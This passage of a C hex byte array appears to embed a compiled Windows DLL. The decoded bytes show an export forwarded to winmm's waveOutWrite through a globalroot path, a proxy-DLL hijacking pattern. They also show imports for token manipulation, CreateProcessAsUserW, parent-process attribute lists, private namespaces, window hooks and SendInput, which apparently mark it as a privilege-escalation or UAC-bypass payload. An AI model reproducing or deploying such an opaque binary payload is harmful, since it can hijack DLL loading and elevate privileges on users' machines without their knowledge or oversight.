	0x65, 0x72, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74,
	0x57, 0x72, 0x69, 0x74, 0x65, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x03, 0x80, 0x03, 0x80,
	0x50, 0x6D, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0xE0, 0x6D, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
	0x20, 0x12, 0x00, 0x00, 0x03, 0x13, 0x00, 0x00, 0xF6, 0x13, 0x00, 0x00, 0x85, 0x14, 0x00, 0x00,
	0x69, 0x16, 0x00, 0x00, 0x86, 0x16, 0x00, 0x00, 0xEC, 0x16, 0x00, 0x00, 0x48, 0x17, 0x00, 0x00,
	0xE5, 0x17, 0x00, 0x00, 0x02, 0x18, 0x00, 0x00, 0x69, 0x18, 0x00, 0x00, 0xC2, 0x18, 0x00, 0x00,
	0x86, 0x19, 0x00, 0x00, 0x99, 0x19, 0x00, 0x00, 0xE1, 0x19, 0x00, 0x00, 0x29, 0x1A, 0x00, 0x00,
	0xF9, 0x1B, 0x00, 0x00, 0x09, 0x1C, 0x00, 0x00, 0x19, 0x1C, 0x00, 0x00, 0xE2, 0x1D, 0x00, 0x00,
	0xAD, 0x1F, 0x00, 0x00, 0x0E, 0x20, 0x00, 0x00, 0x1E, 0x20, 0x00, 0x00, 0x4A, 0x22, 0x00, 0x00,
	0xCD, 0x22, 0x00, 0x00, 0x5F, 0x24, 0x00, 0x00, 0xDD, 0x24, 0x00, 0x00, 0x83, 0x27, 0x00, 0x00,
	0x27, 0x28, 0x00, 0x00, 0x47, 0x29, 0x00, 0x00, 0x6A, 0x29, 0x00, 0x00, 0x00, 0x2A, 0x00, 0x00,
	0x88, 0x2A, 0x00, 0x00, 0xA0, 0x2D, 0x00, 0x00, 0xDD, 0x2D, 0x00, 0x00, 0x8E, 0x2E, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x40, 0x1F, 0x00, 0x00, 0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00,
	0xB4, 0x24, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0x60, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35,
	0x00, 0x00, 0x00, 0x00, 0x60, 0x41, 0x00, 0x00, 0x30, 0x03, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x90, 0x44, 0x00, 0x00, 0xA8, 0x28, 0x00, 0x00, 0x2E, 0x65, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x38, 0x6D, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x76, 0x6F, 0x6C, 0x74, 0x6D, 0x64, 0x00, 0x00, 0x00, 0xE8, 0x6D, 0x00, 0x00,
	0xEC, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62,
	0x67, 0x00, 0x00, 0x00, 0xD4, 0x6E, 0x00, 0x00, 0x8C, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00, 0x60, 0x6F, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00, 0x74, 0x6F, 0x00, 0x00,
	0x60, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00,
	0xD4, 0x70, 0x00, 0x00, 0x7C, 0x06, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x2E, 0x64, 0x61, 0x74,
	0x61, 0x00, 0x00, 0x00, 0x20, 0x80, 0x00, 0x00, 0x54, 0x08, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xE6, 0x70, 0x00, 0x00, 0x8C, 0x40, 0x00, 0x00, 0x88, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xDC, 0x72, 0x00, 0x00, 0x14, 0x40, 0x00, 0x00, 0x08, 0x70, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2A, 0x74, 0x00, 0x00, 0x94, 0x40, 0x00, 0x00,
	0x74, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8E, 0x74, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0xC4, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xD4, 0x74, 0x00, 0x00, 0x50, 0x41, 0x00, 0x00, 0xF0, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xDE, 0x74, 0x00, 0x00, 0x7C, 0x40, 0x00, 0x00, 0x54, 0x70, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x77, 0x00, 0x00, 0xE0, 0x40, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x4C, 0x74, 0x00, 0x00, 0x64, 0x74, 0x00, 0x00, 0x78, 0x74, 0x00, 0x00,
	0x36, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x71, 0x00, 0x00, 0x9E, 0x71, 0x00, 0x00,
	0xB0, 0x71, 0x00, 0x00, 0xBE, 0x71, 0x00, 0x00, 0xCE, 0x71, 0x00, 0x00, 0xDE, 0x71, 0x00, 0x00,
	0xFA, 0x71, 0x00, 0x00, 0x08, 0x72, 0x00, 0x00, 0x64, 0x71, 0x00, 0x00, 0x18, 0x72, 0x00, 0x00,
	0x38, 0x72, 0x00, 0x00, 0x4A, 0x72, 0x00, 0x00, 0x60, 0x72, 0x00, 0x00, 0x72, 0x72, 0x00, 0x00,
	0x80, 0x72, 0x00, 0x00, 0x96, 0x72, 0x00, 0x00, 0x9E, 0x72, 0x00, 0x00, 0xBA, 0x72, 0x00, 0x00,
	0xC8, 0x72, 0x00, 0x00, 0x40, 0x71, 0x00, 0x00, 0x2A, 0x71, 0x00, 0x00, 0x18, 0x71, 0x00, 0x00,
	0x04, 0x71, 0x00, 0x00, 0xF2, 0x70, 0x00, 0x00, 0x7A, 0x71, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x80, 0x06, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00,
	0xD4, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9E, 0x73, 0x00, 0x00, 0xAC, 0x73, 0x00, 0x00,
	0xBC, 0x73, 0x00, 0x00, 0xCA, 0x73, 0x00, 0x00, 0xE0, 0x73, 0x00, 0x00, 0xF6, 0x73, 0x00, 0x00,
	0x0A, 0x74, 0x00, 0x00, 0x7C, 0x73, 0x00, 0x00, 0x18, 0x73, 0x00, 0x00, 0x06, 0x73, 0x00, 0x00,
	0xF8, 0x72, 0x00, 0x00, 0xEA, 0x72, 0x00, 0x00, 0x6A, 0x73, 0x00, 0x00, 0x88, 0x73, 0x00, 0x00,
	0x54, 0x73, 0x00, 0x00, 0x40, 0x73, 0x00, 0x00, 0x24, 0x73, 0x00, 0x00, 0x1A, 0x74, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x28, 0x77, 0x00, 0x00, 0x06, 0x77, 0x00, 0x00, 0xF0, 0x76, 0x00, 0x00,
	0xEC, 0x74, 0x00, 0x00, 0x02, 0x75, 0x00, 0x00, 0x16, 0x75, 0x00, 0x00, 0xFA, 0x75, 0x00, 0x00,
	0x28, 0x75, 0x00, 0x00, 0x3E, 0x75, 0x00, 0x00, 0x5C, 0x75, 0x00, 0x00, 0x6A, 0x75, 0x00, 0x00,
	0x86, 0x75, 0x00, 0x00, 0xA4, 0x75, 0x00, 0x00, 0xB4, 0x75, 0x00, 0x00, 0xCC, 0x75, 0x00, 0x00,
	0xE6, 0x75, 0x00, 0x00, 0x12, 0x76, 0x00, 0x00, 0x1C, 0x76, 0x00, 0x00, 0x36, 0x76, 0x00, 0x00,
	0x44, 0x76, 0x00, 0x00, 0x60, 0x76, 0x00, 0x00, 0x72, 0x76, 0x00, 0x00, 0x80, 0x76, 0x00, 0x00,
	0x8E, 0x76, 0x00, 0x00, 0xA6, 0x76, 0x00, 0x00, 0xC0, 0x76, 0x00, 0x00, 0xE0, 0x76, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xC2, 0x74, 0x00, 0x00, 0xAE, 0x74, 0x00, 0x00, 0x9C, 0x74, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xAF, 0x01, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x45, 0x78, 0x65, 0x63, 0x75,
	0x74, 0x65, 0x45, 0x78, 0x57, 0x00, 0x53, 0x48, 0x45, 0x4C, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C,
	0x6C, 0x00, 0xF9, 0x01, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64, 0x4C, 0x69,
	0x6E, 0x65, 0x57, 0x00, 0x3A, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74,
	0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x3C, 0x01, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65,
	0x49, 0x6F, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x9A, 0x02, 0x47, 0x65, 0x74, 0x4D,
	0x6F, 0x64, 0x75, 0x6C, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x57, 0x00, 0x00,
	0x8F, 0x03, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x50, 0x72, 0x6F, 0x63,
	0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x4C,
	0x69, 0x73, 0x74, 0x00, 0x13, 0x06, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6F, 0x72, 0x53, 0x69, 0x6E,
	0x67, 0x6C, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0xE5, 0x00, 0x43, 0x72, 0x65, 0x61,
	0x74, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x57, 0x00, 0x68, 0x02, 0x47, 0x65, 0x74, 0x46, 0x69, 0x6C,
	0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x57, 0x00, 0x00, 0x4A, 0x01,
	0x44, 0x75, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x00,
	0x3B, 0x04, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0xD8, 0x00,
	0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x57, 0x00, 0x00, 0x86, 0x02,
	0x47, 0x65, 0x74, 0x4C, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x00, 0x00, 0xF6, 0x05,
	0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64,
	0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x9C, 0x00, 0x43, 0x6C, 0x6F, 0x73,
	0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x00, 0xF3, 0x03, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69,
	0x62, 0x72, 0x61, 0x72, 0x79, 0x57, 0x00, 0x00, 0x35, 0x01, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65,
	0x50, 0x72, 0x6F, 0x63, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62,
	0x75, 0x74, 0x65, 0x4C, 0x69, 0x73, 0x74, 0x00, 0xD5, 0x02, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F,
	0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x3B, 0x02, 0x47, 0x65, 0x74, 0x43,
	0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00,
	0x01, 0x01, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x57,
	0x00, 0x00, 0xCD, 0x01, 0x46, 0x72, 0x65, 0x65, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x00,
	0x5F, 0x02, 0x47, 0x65, 0x74, 0x45, 0x78, 0x69, 0x74, 0x43, 0x6F, 0x64, 0x65, 0x50, 0x72, 0x6F,
	0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0xB7, 0x05, 0x53, 0x6C, 0x65, 0x65, 0x70, 0x00, 0x3D, 0x01,
	0x44, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x4C, 0x69, 0x62,
	0x72, 0x61, 0x72, 0x79, 0x43, 0x61, 0x6C, 0x6C, 0x73, 0x00, 0x7F, 0x01, 0x45, 0x78, 0x69, 0x74,
	0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0xC7, 0x05, 0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E,
	0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0x4B, 0x45, 0x52, 0x4E,
	0x45, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x10, 0x01, 0x45, 0x6E, 0x75, 0x6D,
	0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x00, 0xA7, 0x03, 0x53, 0x68, 0x6F, 0x77, 0x57, 0x69,
	0x6E, 0x64, 0x6F, 0x77, 0x00, 0x00, 0x57, 0x02, 0x49, 0x73, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
	0x56, 0x69, 0x73, 0x69, 0x62, 0x6C, 0x65, 0x00, 0xE6, 0x01, 0x47, 0x65, 0x74, 0x57, 0x69, 0x6E,
	0x64, 0x6F, 0x77, 0x00, 0x01, 0x02, 0x47, 0x65, 0x74, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x54,
	0x68, 0x72, 0x65, 0x61, 0x64, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00, 0x00,
	0x98, 0x03, 0x53, 0x65, 0x74, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x48, 0x6F, 0x6F, 0x6B,
	0x45, 0x78, 0x57, 0x00, 0xCD, 0x03, 0x55, 0x6E, 0x68, 0x6F, 0x6F, 0x6B, 0x57, 0x69, 0x6E, 0x64,
	0x6F, 0x77, 0x73, 0x48, 0x6F, 0x6F, 0x6B, 0x45, 0x78, 0x00, 0x20, 0x00, 0x43, 0x61, 0x6C, 0x6C,
	0x4E, 0x65, 0x78, 0x74, 0x48, 0x6F, 0x6F, 0x6B, 0x45, 0x78, 0x00, 0x00, 0x22, 0x03, 0x53, 0x65,
	0x6E, 0x64, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x00, 0x49, 0x03, 0x53, 0x65, 0x74, 0x46, 0x6F, 0x72,
	0x65, 0x67, 0x72, 0x6F, 0x75, 0x6E, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x00, 0x53, 0x01,
	0x47, 0x65, 0x74, 0x44, 0x6C, 0x67, 0x49, 0x74, 0x65, 0x6D, 0x00, 0x00, 0x35, 0x01, 0x47, 0x65,
	0x74, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x4E, 0x61, 0x6D, 0x65, 0x57, 0x00, 0x1A, 0x01, 0x46, 0x69,
	0x6E, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x57, 0x00, 0x5F, 0x01, 0x47, 0x65, 0x74, 0x46,
	0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F, 0x75, 0x6E, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x00,
	0x69, 0x02, 0x4C, 0x6F, 0x61, 0x64, 0x4B, 0x65, 0x79, 0x62, 0x6F, 0x61, 0x72, 0x64, 0x4C, 0x61,
	0x79, 0x6F, 0x75, 0x74, 0x57, 0x00, 0xFD, 0x00, 0x45, 0x6E, 0x75, 0x6D, 0x43, 0x68, 0x69, 0x6C,
	0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x00, 0x00, 0x19, 0x01, 0x46, 0x69, 0x6E, 0x64,
	0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x45, 0x78, 0x57, 0x00, 0xF1, 0x03, 0x56, 0x6B, 0x4B, 0x65,
	0x79, 0x53, 0x63, 0x61, 0x6E, 0x45, 0x78, 0x57, 0x00, 0x00, 0x55, 0x53, 0x45, 0x52, 0x33, 0x32,
	0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x5B, 0x01, 0x47, 0x65, 0x74, 0x54, 0x6F, 0x6B, 0x65, 0x6E,
	0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x8B, 0x00, 0x43, 0x72,
	0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x41, 0x73, 0x55, 0x73, 0x65,
	0x72, 0x57, 0x00, 0x00, 0x0F, 0x02, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
	0x73, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x00, 0x00, 0x57, 0x01, 0x47, 0x65, 0x74, 0x53, 0x69, 0x64,
	0x53, 0x75, 0x62, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x00, 0x00, 0x41, 0x44,
	0x56, 0x41, 0x50, 0x49, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x8E, 0x00, 0x43, 0x6F,
	0x55, 0x6E, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x00, 0x00, 0x28, 0x00,
	0x43, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65,
	0x00, 0x00, 0x5E, 0x00, 0x43, 0x6F, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65,
	0x45, 0x78, 0x00, 0x00, 0x6F, 0x6C, 0x65, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4F, 0x4C,
	0x45, 0x41, 0x55, 0x54, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0xBF, 0x01, 0x4E, 0x74,
	0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x6B, 0x65, 0x6E,
	0x00, 0x00, 0x90, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A,
	0x65, 0x53, 0x69, 0x64, 0x00, 0x00, 0xEB, 0x02, 0x52, 0x74, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63,
	0x61, 0x74, 0x65, 0x48, 0x65, 0x61, 0x70, 0x00, 0xE8, 0x05, 0x52, 0x74, 0x6C, 0x53, 0x75, 0x62,
	0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x53, 0x69, 0x64, 0x00, 0x00, 0x51, 0x03,
	0x52, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x42, 0x6F, 0x75, 0x6E, 0x64, 0x61, 0x72,
	0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x6F, 0x72, 0x00, 0xB0, 0x01, 0x4E, 0x74,
	0x4F, 0x70, 0x65, 0x6E, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0xF0, 0x01, 0x4E, 0x74, 0x51, 0x75,
	0x65, 0x72, 0x79, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x50, 0x72,
	0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x81, 0x03, 0x52, 0x74, 0x6C, 0x44, 0x65, 0x6C, 0x65, 0x74,
	0x65, 0x42, 0x6F, 0x75, 0x6E, 0x64, 0x61, 0x72, 0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70,
	0x74, 0x6F, 0x72, 0x00, 0xBE, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63,
	0x65, 0x73, 0x73, 0x00, 0x7A, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69,
	0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0xF3, 0x01, 0x4E, 0x74,
	0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E,
	0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x00, 0x50, 0x01, 0x4E, 0x74, 0x44, 0x65, 0x6C, 0x61, 0x79, 0x45,
	0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0xE5, 0x04, 0x52, 0x74, 0x6C, 0x4C,
	0x65, 0x6E, 0x67, 0x74, 0x68, 0x52, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64, 0x53, 0x69, 0x64,
	0x00, 0x00, 0x08, 0x01, 0x4E, 0x74, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x7B, 0x04, 0x52, 0x74,
	0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69,
	0x6E, 0x67, 0x45, 0x78, 0x00, 0x00, 0x05, 0x04, 0x52, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x53,
	0x69, 0x64, 0x00, 0x00, 0xB1, 0x05, 0x52, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45, 0x6E, 0x76, 0x69,
	0x72, 0x6F, 0x6E, 0x6D, 0x65, 0x6E, 0x74, 0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 0x6C, 0x65, 0x00,
	0x2B, 0x03, 0x52, 0x74, 0x6C, 0x43, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x43, 0x72, 0x63, 0x33,
	0x32, 0x00, 0x53, 0x02, 0x4E, 0x74, 0x53, 0x65, 0x74, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x00,
	0x02, 0x04, 0x52, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x48, 0x65, 0x61, 0x70, 0x00, 0x9C, 0x02,
	0x4E, 0x74, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F, 0x66, 0x53, 0x65, 0x63,
	0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0xBD, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72,
	0x69, 0x76, 0x61, 0x74, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00,
	0xE1, 0x02, 0x52, 0x74, 0x6C, 0x41, 0x64, 0x64, 0x53, 0x49, 0x44, 0x54, 0x6F, 0x42, 0x6F, 0x75,
	0x6E, 0x64, 0x61, 0x72, 0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x6F, 0x72, 0x00,
	0xC3, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00,
	0xA4, 0x01, 0x4E, 0x74, 0x4D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F, 0x66, 0x53, 0x65, 0x63,
	0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0x6F, 0x00, 0x4C, 0x64, 0x72, 0x44, 0x69, 0x73, 0x61, 0x62,
	0x6C, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x61, 0x6C, 0x6C, 0x6F, 0x75, 0x74, 0x73,
	0x46, 0x6F, 0x72, 0x44, 0x6C, 0x6C, 0x00, 0x00, 0x42, 0x00, 0x45, 0x74, 0x77, 0x45, 0x76, 0x65,
	0x6E, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65, 0x4E, 0x6F, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x72,
	0x61, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
